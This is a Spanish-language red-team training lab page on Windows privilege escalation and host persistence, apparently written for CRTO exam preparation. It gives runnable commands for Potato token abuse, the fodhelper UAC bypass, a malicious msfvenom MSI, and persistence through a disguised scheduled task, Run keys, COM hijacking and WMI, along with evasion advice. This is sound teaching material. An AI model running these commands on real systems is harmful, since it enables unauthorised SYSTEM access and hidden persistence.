# Technique — Lab-10 Deep Root

> **Capability (eje didáctico):** Host Persistence & Privilege Escalation — elevar privilegios en el host y establecer persistencia que sobrevive a resets de cuenta, sin hacer ruido innecesario.
> **Bloque CRTO:** Host Privilege Escalation + Host Persistence (secuencia obligada antes de tocar el dominio).
> **Arquetipo:** Operación (A) — kill-chain real. El `execution/` es el plan de ataque.
> **Adversario (escenario):** Lazarus Group — ver [`emulation.md`](emulation.md).

> El criterio del lab no es "qué técnica existe" sino **cuál elegir según lo que el host permite, sin ruido innecesario**. Elevar antes de persistir; persistir antes de arriesgar.

---

## 1. El orden importa: elevar → persistir → validar

El error frecuente es persistir desde un contexto sin elevar, obteniendo persistencia de bajo privilegio que vale poco. El orden correcto:

1. **Elevar** a SYSTEM o High Integrity.
2. **Persistir** desde ese contexto elevado (persistencia privilegiada y robusta).
3. **Validar** que la persistencia sobrevive a reinicio/logoff.
4. **Limpiar** artefactos innecesarios.

## 2. Escalada de privilegios — vías principales

### 2.1 Token Abuse — SeImpersonate → Potato (la reina)

Cuando la cuenta tiene `SeImpersonatePrivilege` (común en cuentas de servicio IIS, MSSQL, WCF), los Potato exploits permiten escalar a SYSTEM sin exploit de kernel.

```powershell
# Verificar privilegios
whoami /priv
# Si SeImpersonatePrivilege está presente:

# PrintSpoofer (Windows 10/Server 2019+)
.\PrintSpoofer64.exe -i -c cmd

# GodPotato (más universal)
.\GodPotato.exe -cmd "cmd /c whoami"

# SweetPotato (alternativa)
.\SweetPotato.exe -e EfsRpc -p cmd.exe
```

**Por qué es la reina:** es limpia (no toca el kernel), muy frecuente en entornos enterprise (servicios con cuentas de servicio) y el examen CRTO la incluye de forma casi garantizada.

### 2.2 Misconfiguración de servicios

Si el operador tiene permisos de escritura sobre la ruta de un servicio o sobre su binario:

```powershell
# Enumerar servicios con rutas sin comillas (Unquoted Service Path)
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Permisos débiles sobre el binario de un servicio
icacls "C:\Program Files\VulnerableService\service.exe"

# Si se puede escribir → reemplazar con beacon / shell
```

### 2.3 UAC Bypass (Medium → High Integrity)

Cuando el usuario es admin local pero el proceso corre en Medium Integrity:

```powershell
# Técnica fodhelper (clásica, sin popup)
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "cmd.exe" -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
```

> **OPSEC:** cada bypass tiene una firma en el registro o en el proceso. Elegir el que el entorno no vigila de cerca (ver `detection.md`).

### 2.4 AlwaysInstallElevated

Si ambas claves de registro están activas, cualquier MSI se instala con SYSTEM:

```powershell
# Verificar
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Explotar: generar MSI malicioso con msfvenom / Covenant / CS
msfvenom -p windows/x64/exec CMD="cmd.exe" -f msi -o privesc.msi
msiexec /quiet /qn /i privesc.msi
```

## 3. Persistencia de host — mecanismos y proporcionalidad

La clave no es usar el mecanismo más sofisticado sino **el que pasa desapercibido en ESE entorno**.

| Mecanismo | Sigilo | Robustez | Detectabilidad |
|-----------|--------|----------|----------------|
| Registry Run keys | bajo | medio | alta (muy vigiladas) |
| Scheduled Task | medio | alta | media |
| Service | medio | alta | media (Event 7045) |
| COM Hijacking | alto | media | baja |
| WMI Event Subscription | muy alto | alta | muy baja |

### 3.1 Run Keys (rápido pero ruidoso)

```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Windows\Temp\beacon.exe"
```

### 3.2 Scheduled Task (equilibrio)

```powershell
schtasks /create /tn "SystemHealthCheck" /tr "C:\Windows\Temp\beacon.exe" /sc onlogon /ru SYSTEM /f
```

### 3.3 COM Hijacking (sigiloso)

Buscar CLSIDs en HKCU que sobreescriban a los de HKLM (el sistema buscará en HKCU primero):

```powershell
# Con PowerSploit / SharpUp
Find-ProcessDLLHijack
# Plantar DLL en la ruta del CLSID de HKCU
```

### 3.4 WMI Event Subscription (el más sigiloso)

```powershell
# Persistencia que se activa por evento del sistema (logon, intervalo de tiempo)
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter ...
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer ...
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding ...
```

## 4. Equivalencia CS ↔ Sliver

| Acción | Cobalt Strike | Sliver |
|--------|---------------|--------|
| Verificar privilegios | `getprivs` | `getprivs` |
| SeImpersonate → Potato | `execute-assembly PrintSpoofer.exe` | `execute-assembly PrintSpoofer.exe` |
| Listar servicios vulnerables | `execute-assembly SharpUp.exe` | `execute-assembly SharpUp.exe` |
| Crear Scheduled Task | `execute-assembly SharPersist.exe` | `shell schtasks ...` |
| COM Hijacking | `execute-assembly SharPersist.exe -t com` | similar |

## 5. MITRE ATT&CK

| Táctica | Técnica | ID |
|---------|---------|----|
| Privilege Escalation | Access Token Manipulation: Token Impersonation | T1134.001 |
| Privilege Escalation | Abuse Elevation Control Mechanism: Bypass UAC | T1548.002 |
| Privilege Escalation | Hijack Execution Flow | T1574 |
| Persistence | Boot or Logon Autostart: Registry Run Keys | T1547.001 |
| Persistence | Scheduled Task/Job | T1053.005 |
| Persistence | Create or Modify System Process: Windows Service | T1543.003 |
| Persistence | Event Triggered Execution: WMI Event Subscription | T1546.003 |

## 6. Key Takeaways

1. **SeImpersonate es la llave maestra.** Si `getprivs` lo muestra (común en cuentas de servicio), Potato → SYSTEM es la vía más limpia, preferible a un exploit de kernel ruidoso.
2. **Elevar antes de persistir.** Persistencia creada desde SYSTEM es robusta y privilegiada; desde un usuario bajo, vale poco.
3. **Proporcionalidad sobre sofisticación.** El mecanismo correcto no es el más exótico sino el que ese entorno no vigila de cerca. WMI no siempre es mejor que una tarea si el equipo SOC tiene una regla para WMI.
4. **Validar o no cuenta.** Una persistencia no validada (no comprobaste que sobrevive al reinicio) puede costarte el acceso en el peor momento.
5. **El orden protege.** Persistir antes de arriesgar movimientos ruidosos hacia el dominio significa que, si algo sale mal, sigues teniendo el acceso.

## Referencias

- The Hacker Recipes — Privilege Escalation, Persistence
- MITRE ATT&CK — T1134, T1548.002, T1547, T1053.005, T1543.003, T1546.003
- SharpUp, SharPersist, PrintSpoofer, GodPotato — documentación de los proyectos
- CRTO — Host Privilege Escalation + Host Persistence modules

---

*Technique · Lab-10 Deep Root · Host Persistence & Privilege Escalation (anatomía v3.1, arquetipo operación)*
